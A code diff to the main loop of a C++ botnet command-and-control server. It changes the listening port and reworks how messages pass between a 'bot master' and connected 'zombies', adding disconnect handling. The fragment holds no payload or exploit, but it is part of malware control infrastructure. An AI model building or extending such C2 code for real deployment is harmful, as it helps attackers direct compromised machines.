@@ -5,7 +5,7 @@
 int main()
 {
 	std::cout << "Init CanC" << std::endl;
-	Server CandC("127.0.0.1", 54001);
+	Server CandC("127.0.0.1", 54002);
 
 	if (!CandC.init())
 		return 0;
@@ -36,17 +36,20 @@ int main()
 				std::string bmsg = CandC.getBotMasterMessage();
 				if (!bmsg.empty())
 				{
-					std::cout << CandC.getBotMasterMessage() << std::endl;
-					CandC.sendToZombies(CandC.getBotMasterMessage());
+					std::cout << bmsg << std::endl;
+					CandC.sendToZombies(bmsg.c_str(), bmsg.size());
 				}
 
-				std::vector<std::string> zmsgs = CandC.getBotMessages();
-				if (!zmsgs.empty())
+				std::vector<const char*> zmsgs = CandC.getBotMessages();
+				for (const char* zmsg : zmsgs)
 				{
-					for (std::string zmsg : zmsgs)
-					{
-						CandC.sendToBotmaster(zmsg);
-					}
+					std::cout << zmsg << std::endl;
+					CandC.sendToBotmaster(zmsg, strlen(zmsg));
+				}
+
+				if (CandC.clientDisconnect())
+				{
+					CandC.closeConnections();
 				}
 			}
 		}
@@ -56,6 +59,5 @@ int main()
 		std::cout << "couldnt create server socket" << std::endl;
 	}
 
-	std::cin.get();
 	return 0;
 }
